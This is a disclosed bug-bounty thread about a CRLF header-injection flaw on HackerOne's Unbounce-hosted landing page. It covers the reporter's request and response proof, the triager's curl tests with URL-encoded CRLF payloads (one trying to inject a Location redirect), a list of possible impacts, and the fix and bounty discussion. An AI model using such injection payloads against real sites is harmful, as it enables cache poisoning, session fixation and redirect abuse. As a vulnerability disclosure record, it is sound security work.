title: CRLF injection in info.hacker.one

activities.message: I'll check this out with the technical team that owns this service.  Thanks for the heads up.
activities.markdown_message: I'll check this out with the technical team that owns this service. Thanks for the heads up.

activities.message: Let me know , when it is fixed .
activities.markdown_message: Let me know , when it is fixed .

activities.message:
I don't see how this is an issue.  The defacement is still within the Location response header.  When I attempt to follow the redirect nothing bad happens.

```
$ curl -I -L http://info.hacker.one/%0d%0a%09headername:%20headervalue
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Date: Wed, 29 Mar 2017 18:52:10 GMT
Location: http://info.hacker.one/
        headername: headervalue/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-0288821d9e.us-west-1.unbounce.net
Connection: keep-alive

HTTP/1.1 404 Not Found
Content-Length: 47
Content-Type: text/plain; charset=ISO-8859-1
Date: Wed, 29 Mar 2017 18:52:10 GMT
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-0288821d9e.us-west-1.unbounce.net
Connection: keep-alive
```

If I attempt to deface a known header (e.g. X-Powered-By), I still get the proper header, so this issue is not overwriting existing headers and following the redirect still works (though the page is 404).

```
$ curl -I http://info.hacker.one/%0d%0a%09X-Powered-By:%20headervalue
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Date: Wed, 29 Mar 2017 18:55:48 GMT
Location: http://info.hacker.one/
        X-Powered-By: headervalue/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-007ac696cf.us-west-1.unbounce.net
Connection: keep-alive
```

activities.message:
@ubscott,

https://prakharprasad.com/crlf-injection-http-response-splitting-explained/ goes over this in some detail, but a few things that are concerning would be:

* 1) ability to set cookies (leading to session fixation or other issues)
* 2) set alternate location headers that redirect elsewhere
* 3) set headers like HSTS that could cause a DoS for some sites that don't support TLS yet
* 4) inject rogue content (which could be cached)

Does that help?
activities.markdown_message:
@ubscott,

https://prakharprasad.com/crlf-injection-http-response-splitting-explained/ goes over this in some detail, but a few things that are concerning would be:

  • 1) ability to set cookies (leading to session fixation or other issues)
  • 2) set alternate location headers that redirect elsewhere
  • 3) set headers like HSTS that could cause a DoS for some sites that don't support TLS yet
  • 4) inject rogue content (which could be cached)

Does that help?

activities.message:
Gotcha.  I'll bring this back to the team.  I've been trying to set these things in a Web browser, but the CRLF gets filtered out, though in curl it works...kind of...so long as the client accepts a tab character prefixed in a response header.  And attempting to rewrite the Location header doesn't work:

```
$ curl -I -L http://info.hacker.one/%0d%0a%09Location:%20http%3A%2F%2Fgoogle.com
HTTP/1.1 404 Not Found
Content-Length: 47
Content-Type: text/plain; charset=ISO-8859-1
Date: Wed, 29 Mar 2017 19:32:30 GMT
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-0288821d9e.us-west-1.unbounce.net
Connection: keep-alive
```

If it worked, the response would be from google.com, not Unbounce.  The response is rendered as a 404 instead of a 3xx so the redirect doesn't happen.

Either way, I'll get back to you later today or tomorrow morning.

Either way, I'll get back to you later today or tomorrow morning.

activities.message: Any Updates?
activities.markdown_message: Any Updates?

activities.message: @ubscott any updates?
activities.markdown_message: @ubscott any updates?

activities.message: Not yet.  The tech team thinks it is due to a bug in a new version of the web server they are using, so they are looking to downgrade or patch it.  Stay tuned.  I don't have an ETA on a fix yet, but I'll follow up when I have more info.
activities.markdown_message: Not yet. The tech team thinks it is due to a bug in a new version of the web server they are using, so they are looking to downgrade or patch it. Stay tuned. I don't have an ETA on a fix yet, but I'll follow up when I have more info.

activities.message:
Let me know when the vulnerability is resolved .
Awaiting your reply .
activities.markdown_message:
Let me know when the vulnerability is resolved .
Awaiting your reply .

activities.message:
This is now fixed.  RCA is that a new version of the web server used exposed this vulnerability.  Downgrading to the older version fixed the issue.

```
$ curl -I http://info.hacker.one/%0d%0a%09foo:bar
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Date: Sat, 01 Apr 2017 02:39:23 GMT
Location: http://info.hacker.one/%0d%0a%09foo:bar/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.119 73c5a89
X-Server-Instance: ps2-0957928080.us-west-1.unbounce.net
Connection: keep-alive
```
activities.markdown_message:

activities.message: Yes , it seems fixed .
activities.markdown_message: Yes , it seems fixed .

activities.message: I appreciate your quick response.Let me know about the status of the bounty .
activities.markdown_message: I appreciate your quick response.Let me know about the status of the bounty .

activities.message: It is eligible for a bounty , right ?
activities.markdown_message: It is eligible for a bounty , right ?

activities.message: @ubscott  any updates?
activities.markdown_message: @ubscott any updates?

activities.message:
Hi @thalaivarsubu, it was the weekend for me, so I wasn't able to reply until now.

Determining bounty eligibility for this is not my call, as Unbounce is the landing page provider for the HackerOne endpoint in this disclosure.  I can only provide insight into whether the issue has been fixed or not.

That being said, we were not able to use the vulnerability in the upstream library to modify response headers.  The tab character prefixed to the header key was interrupting this exploit.  I can't find anywhere in the HTTP spec that allows a control character to start a header name.
activities.markdown_message:
Hi @thalaivarsubu, it was the weekend for me, so I wasn't able to reply until now.

Determining bounty eligibility for this is not my call, as Unbounce is the landing page provider for the HackerOne endpoint in this disclosure. I can only provide insight into whether the issue has been fixed or not.

That being said, we were not able to use the vulnerability in the upstream library to modify response headers. The tab character prefixed to the header key was interrupting this exploit. I can't find anywhere in the HTTP spec that allows a control character to start a header name.

Its okay . Weekend's are meant to be enjoyed .

When will i get an intimation regarding the bounty ?

I have another vulnerability to be report ;

You are vulnerable to File Inclusion ;
It seems that this script includes a file which name is determined using user-supplied data. This data is not properly validated before being passed to the include function.

See this Unlisted video POC;
https://youtu.be/1788WOhumfM

Please fix this issue .
Awaiting your reply .

@ubscott summed up my thoughts perfectly.

As a code change was made, I'm happy to resolve this with Hall of Fame, but no bounty will be awarded.

In the future, it's very inappropriate to request updates so soon, and you should be patient. Also, you should only report one issue per report. Also, your new POC is related to @ubnt, not Unbounce. They are completely different companies.

activities.message:
Thanks for the report. Keep in mind that Unbounce issues are handled on a case-by-case basis and are not directly part of the HackerOne program. We (HackerOne) are really only interested in critical vulnerabilities that affect our Unbounce landing page instance (`info.hacker.one`).

Happy hacking!
activities.markdown_message:
Thanks for the report. Keep in mind that Unbounce issues are handled on a case-by-case basis and are not directly part of the HackerOne program. We (HackerOne) are really only interested in critical vulnerabilities that affect our Unbounce landing page instance (info.hacker.one).

Happy hacking!

activities.message: Thanks for the HOF
activities.markdown_message: Thanks for the HOF

activities.message: Again, only one report per issue. That also doesn't seem like a critical issue (or possibly valid at all), and videos should never be the only thing used to describe an issue. You should follow the directions at https://unbounce.com/security/ to report the issue to Unbounce if you feel it's valid.
activities.markdown_message: Again, only one report per issue. That also doesn't seem like a critical issue (or possibly valid at all), and videos should never be the only thing used to describe an issue. You should follow the directions at https://unbounce.com/security/ to report the issue to Unbounce if you feel it's valid.

activities.message: Will i at least get a Swag?
activities.markdown_message: Will i at least get a Swag?

vulnerability_information_html:
Vulnerable URL:
info.hacker.one

Vulnerability description
This script is possibly vulnerable to CRLF injection attacks.

HTTP headers have the structure "Key: Value", where each line is separated by the CRLF combination. If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.
HTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.

URI was set to headername: headervalue
Injected header found:

headername: headervalue

Request
GET /%0d%0a%09headername:%20headervalue HTTP/1.1
Host: info.hacker.one
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

Response
HTTP/1.1 301 Moved Permanently
Date: Wed, 29 Mar 2017 18:11:47 GMT
Location: http://info.hacker.one/
headername: headervalue/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-07ebf0a99d.ap-southeast-1.unbounce.net
Content-Length: 0
Connection: keep-alive
